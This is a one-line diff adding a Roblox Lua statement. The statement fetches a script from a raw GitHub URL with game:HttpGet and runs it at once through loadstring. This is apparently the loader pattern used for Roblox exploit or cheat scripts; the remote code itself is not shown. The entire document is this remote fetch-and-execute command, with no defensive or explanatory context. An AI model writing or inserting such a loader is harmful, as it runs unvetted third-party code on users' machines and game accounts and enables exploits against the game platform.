@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PitchyATree/roblox/main/stranger%208787"))()
